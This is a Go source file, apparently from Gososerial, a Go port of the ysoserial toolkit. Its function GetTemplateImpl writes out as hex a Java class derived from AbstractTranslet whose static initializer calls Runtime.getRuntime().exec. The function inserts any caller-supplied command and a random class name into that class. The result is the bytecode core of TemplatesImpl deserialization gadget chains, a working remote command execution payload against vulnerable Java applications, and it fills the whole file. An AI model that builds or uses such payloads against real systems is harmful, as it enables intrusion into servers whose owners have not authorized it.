package gadget

import (
	"encoding/binary"
	"encoding/hex"
	"github.com/EmYiQing/Gososerial/tool"
	"strings"
)

func GetTemplateImpl(cmd string) []byte {
	prefix := "CAFEBABE0000003200390A00030022070037070025070026010" +
		"01073657269616C56657273696F6E5549440100014A01000D436F6E73" +
		"74616E7456616C756505AD2093F391DDEF3E0100063C696E69743E010" +
		"003282956010004436F646501000F4C696E654E756D6265725461626C" +
		"650100124C6F63616C5661726961626C655461626C650100047468697" +
		"3010013537475625472616E736C65745061796C6F616401000C496E6E" +
		"6572436C61737365730100354C79736F73657269616C2F7061796C6F6" +
		"164732F7574696C2F4761646765747324537475625472616E736C6574" +
		"5061796C6F61643B0100097472616E73666F726D010072284C636F6D2" +
		"F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E61" +
		"6C2F78736C74632F444F4D3B5B4C636F6D2F73756E2F6F72672F61706" +
		"16368652F786D6C2F696E7465726E616C2F73657269616C697A65722F" +
		"53657269616C697A6174696F6E48616E646C65723B2956010008646F6" +
		"3756D656E7401002D4C636F6D2F73756E2F6F72672F6170616368652F" +
		"78616C616E2F696E7465726E616C2F78736C74632F444F4D3B0100086" +
		"8616E646C6572730100425B4C636F6D2F73756E2F6F72672F61706163" +
		"68652F786D6C2F696E7465726E616C2F73657269616C697A65722F536" +
		"57269616C697A6174696F6E48616E646C65723B01000A457863657074" +
		"696F6E730700270100A6284C636F6D2F73756E2F6F72672F617061636" +
		"8652F78616C616E2F696E7465726E616C2F78736C74632F444F4D3B4C" +
		"636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726" +
		"E616C2F64746D2F44544D417869734974657261746F723B4C636F6D2F" +
		"73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F7" +
		"3657269616C697A65722F53657269616C697A6174696F6E48616E646C" +
		"65723B29560100086974657261746F720100354C636F6D2F73756E2F6" +
		"F72672F6170616368652F786D6C2F696E7465726E616C2F64746D2F44" +
		"544D417869734974657261746F723B01000768616E646C65720100414" +
		"C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E746572" +
		"6E616C2F73657269616C697A65722F53657269616C697A6174696F6E4" +
		"8616E646C65723B01000A536F7572636546696C6501000C4761646765" +
		"74732E6A6176610C000A000B07002801003379736F73657269616C2F7" +
		"061796C6F6164732F7574696C2F476164676574732453747562547261" +
		"6E736C65745061796C6F6164010040636F6D2F73756E2F6F72672F617" +
		"0616368652F78616C616E2F696E7465726E616C2F78736C74632F7275" +
		"6E74696D652F41627374726163745472616E736C65740100146A61766" +
		"12F696F2F53657269616C697A61626C65010039636F6D2F73756E2F6F" +
		"72672F6170616368652F78616C616E2F696E7465726E616C2F78736C7" +
		"4632F5472616E736C6574457863657074696F6E01001F79736F736572" +
		"69616C2F7061796C6F6164732F7574696C2F476164676574730100083" +
		"C636C696E69743E0100116A6176612F6C616E672F52756E74696D6507" +
		"002A01000A67657452756E74696D6501001528294C6A6176612F6C616" +
		"E672F52756E74696D653B0C002C002D0A002B002E01"
	cmdLen := len(cmd)
	cmdLenByte := make([]byte, 2)
	binary.BigEndian.PutUint16(cmdLenByte, uint16(cmdLen))
	cmdLenStr := strings.ToUpper(hex.EncodeToString(cmdLenByte))
	cmdStr := strings.ToUpper(hex.EncodeToString([]byte(cmd)))
	beforeRandStr := "08003001000465786563010027284C6A6176612F6C6" +
		"16E672F537472696E673B294C6A6176612F6C616E672F50726F63657" +
		"3733B0C003200330A002B003401000D537461636B4D61705461626C6" +
		"501001D79736F73657269616C2F50776E6572"
	randStr := tool.GetRandomIntStr(14)
	randStr = hex.EncodeToString([]byte(randStr))
	split := "01001F4C79736F73657269616C2F50776E6572"
	suffix := "3B002100020003000100040001001A000500060001000700000" +
		"002000800040001000A000B0001000C0000002F00010001000000052A" +
		"B70001B100000002000D0000000600010000002F000E0000000C00010" +
		"0000005000F003800000001001300140002000C0000003F0000000300" +
		"000001B100000002000D00000006000100000034000E0000002000030" +
		"0000001000F0038000000000001001500160001000000010017001800" +
		"020019000000040001001A00010013001B0002000C000000490000000" +
		"400000001B100000002000D00000006000100000038000E0000002A00" +
		"0400000001000F003800000000000100150016000100000001001C001" +
		"D000200000001001E001F00030019000000040001001A00080029000B" +
		"0001000C00000024000300020000000FA70003014CB8002F1231B6003" +
		"557B10000000100360000000300010300020020000000020021001100" +
		"00000A00010002002300100009"
	result := prefix + cmdLenStr + cmdStr + beforeRandStr + randStr + split + randStr + suffix
	data, _ := hex.DecodeString(result)
	return data
}
